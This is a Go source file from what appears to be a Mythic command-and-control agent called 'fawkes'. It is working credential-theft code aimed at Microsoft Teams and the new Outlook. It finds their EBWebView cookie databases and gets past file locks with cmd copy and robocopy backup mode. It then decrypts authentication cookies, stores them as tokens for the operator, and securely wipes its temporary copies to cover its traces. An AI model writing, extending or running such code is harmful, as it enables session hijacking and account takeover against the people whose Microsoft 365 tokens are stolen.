//go:build windows

package commands

import (
	"database/sql"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

// ebWebViewApp defines an application that uses EBWebView for token storage
type ebWebViewApp struct {
	name     string
	basePath string // EBWebView root directory (contains Local State + profile dirs)
}

// credEBWebViewTokens extracts encrypted cookies from EBWebView-based M365 apps.
// Scans all profile directories (Default, WV2Profile_tfw, etc.) not just Default.
func credEBWebViewTokens(sb *strings.Builder) []structs.MythicCredential {
	sb.WriteString("--- EBWebView Token Cookies ---\n")

	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		sb.WriteString("  LOCALAPPDATA not set\n\n")
		return nil
	}

	apps := []ebWebViewApp{
		{
			name:     "Microsoft Teams",
			basePath: filepath.Join(localAppData, "Packages", "MSTeams_8wekyb3d8bbwe", "LocalCache", "Microsoft", "MSTeams", "EBWebView"),
		},
		{
			name:     "Outlook (New)",
			basePath: filepath.Join(localAppData, "Microsoft", "Olk", "EBWebView"),
		},
	}

	var allCreds []structs.MythicCredential

	for _, app := range apps {
		creds := extractEBWebViewCookies(sb, app)
		allCreds = append(allCreds, creds...)
	}

	sb.WriteString("\n")
	return allCreds
}

// extractEBWebViewCookies extracts auth cookies from all profiles within an EBWebView app.
// EBWebView apps may store cookies in Default, WV2Profile_tfw, or other profile directories.
func extractEBWebViewCookies(sb *strings.Builder, app ebWebViewApp) []structs.MythicCredential {
	sb.WriteString(fmt.Sprintf("\n  [%s]\n", app.name))

	// Check if the app's EBWebView directory exists
	localStatePath := filepath.Join(app.basePath, "Local State")
	if _, err := os.Stat(localStatePath); os.IsNotExist(err) {
		sb.WriteString("    Not installed\n")
		return nil
	}

	// Get encryption key using existing browser infrastructure
	key, err := getEncryptionKey(app.basePath)
	if err != nil {
		sb.WriteString(fmt.Sprintf("    Failed to get encryption key: %v\n", err))
		return nil
	}
	defer structs.ZeroBytes(key)

	// Discover all profile directories that contain a Cookies database
	entries, err := os.ReadDir(app.basePath)
	if err != nil {
		sb.WriteString(fmt.Sprintf("    Failed to list profiles: %v\n", err))
		return nil
	}

	var allCreds []structs.MythicCredential
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		// Check Network/Cookies (modern Chromium path)
		cookiesPath := filepath.Join(app.basePath, entry.Name(), "Network", "Cookies")
		if _, err := os.Stat(cookiesPath); os.IsNotExist(err) {
			// Also check direct Cookies path (older layout)
			cookiesPath = filepath.Join(app.basePath, entry.Name(), "Cookies")
			if _, err := os.Stat(cookiesPath); os.IsNotExist(err) {
				continue
			}
		}

		creds := extractProfileCookies(sb, app.name, entry.Name(), cookiesPath, key)
		allCreds = append(allCreds, creds...)
	}

	if len(allCreds) == 0 {
		sb.WriteString("    No auth cookies found in any profile\n")
	}
	return allCreds
}

// extractProfileCookies extracts auth cookies from a single profile's cookies DB
func extractProfileCookies(sb *strings.Builder, appName, profile, cookiesPath string, key []byte) []structs.MythicCredential {
	sb.WriteString(fmt.Sprintf("    [Profile: %s]\n", profile))

	// Open the cookies database — try openBrowserDB first, then cmd /c copy fallback
	db, cleanup, err := openBrowserDB(cookiesPath)
	if err != nil {
		// EBWebView processes may hold exclusive locks that defeat both CreateFileW
		// sharing and esentutl. Try cmd /c copy as a last resort.
		db, cleanup, err = openDBViaCmdCopy(cookiesPath)
		if err != nil {
			sb.WriteString(fmt.Sprintf("      Failed to open cookies DB: %v\n", err))
			return nil
		}
	}
	defer cleanup()

	// Query all cookies — we'll filter for auth-relevant ones
	rows, err := db.Query("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
	if err != nil {
		sb.WriteString(fmt.Sprintf("      Failed to query cookies: %v\n", err))
		return nil
	}
	defer rows.Close()

	var creds []structs.MythicCredential
	totalCookies := 0
	authCookies := 0

	for rows.Next() {
		var hostKey, name, path string
		var encValue []byte
		var expiresUTC int64
		var isSecure, isHTTPOnly int

		if err := rows.Scan(&hostKey, &name, &encValue, &path, &expiresUTC, &isSecure, &isHTTPOnly); err != nil {
			continue
		}
		totalCookies++

		// Check if this cookie matches any auth patterns
		desc := matchAuthCookie(hostKey, name)
		if desc == "" {
			continue
		}

		authCookies++

		// Decrypt the cookie value
		var value string
		if len(encValue) > 0 {
			value, err = decryptPassword(encValue, key)
			if err != nil {
				sb.WriteString(fmt.Sprintf("      [!] %s/%s: decrypt failed: %v\n", hostKey, name, err))
				continue
			}
		}

		if value == "" {
			continue
		}

		// Display with truncation
		display := value
		if len(display) > 100 {
			display = display[:50] + "..." + display[len(display)-30:]
		}
		sb.WriteString(fmt.Sprintf("      [COOKIE] %s — %s (%s)\n", name, desc, hostKey))
		sb.WriteString(fmt.Sprintf("        Value: %s\n", display))

		creds = append(creds, structs.MythicCredential{
			CredentialType: "token",
			Realm:          hostKey,
			Account:        name,
			Credential:     value,
			Comment:        fmt.Sprintf("%s %s cookie (%s)", appName, desc, profile),
		})

		structs.ZeroString(&value)
	}
	if err := rows.Err(); err != nil {
		sb.WriteString(fmt.Sprintf("      Row iteration error: %v\n", err))
	}

	sb.WriteString(fmt.Sprintf("      Scanned %d cookies, found %d auth-related\n", totalCookies, authCookies))
	return creds
}

// openDBViaCmdCopy tries to open a locked SQLite DB using multiple copy strategies.
// Also copies WAL/SHM journals for WAL-mode databases.
func openDBViaCmdCopy(dbPath string) (*sql.DB, func(), error) {
	// Create a temp directory — robocopy preserves original filenames
	tmpDir, err := os.MkdirTemp("", "ewcookies-*")
	if err != nil {
		return nil, func() {}, err
	}

	srcDir := filepath.Dir(dbPath)
	srcFile := filepath.Base(dbPath)
	tmpFile := filepath.Join(tmpDir, srcFile)

	// Try copy strategies for the main DB file
	copied := false

	// Strategy 1: cmd /c copy
	if _, cmdErr := execCmdTimeout("cmd", "/c", "copy", "/y", dbPath, tmpFile); cmdErr == nil {
		copied = true
	}

	// Strategy 2: robocopy /B (backup-intent mode — can bypass exclusive locks)
	// robocopy exit codes: 0=no files, 1=files copied, 2+=errors/extras
	if !copied {
		execCmdTimeout("robocopy", "/B", srcDir, tmpDir, srcFile) //nolint:errcheck
		if _, statErr := os.Stat(tmpFile); statErr == nil {
			copied = true
		}
	}

	if !copied {
		secureRemoveDir(tmpDir)
		return nil, func() {}, fmt.Errorf("DB locked by process (all copy strategies failed)")
	}

	// Also copy WAL and SHM journals if they exist
	for _, ext := range []string{"-wal", "-shm"} {
		execCmdTimeout("cmd", "/c", "copy", "/y", dbPath+ext, filepath.Join(tmpDir, srcFile+ext)) //nolint:errcheck
	}

	db, err := sql.Open("sqlite", tmpFile)
	if err != nil {
		secureRemoveDir(tmpDir)
		return nil, func() {}, err
	}

	// Verify the DB is actually usable
	if pingErr := db.Ping(); pingErr != nil {
		db.Close()
		secureRemoveDir(tmpDir)
		return nil, func() {}, fmt.Errorf("DB copy unusable: %w", pingErr)
	}

	cleanup := func() {
		db.Close()
		secureRemoveDir(tmpDir)
	}
	return db, cleanup, nil
}

// secureRemoveDir securely overwrites all files in a directory, then removes it.
// Use instead of os.RemoveAll() for directories containing sensitive data (credential DBs, etc.).
func secureRemoveDir(dirPath string) {
	_ = filepath.WalkDir(dirPath, func(path string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		secureRemove(path)
		return nil
	})
	os.RemoveAll(dirPath)
}
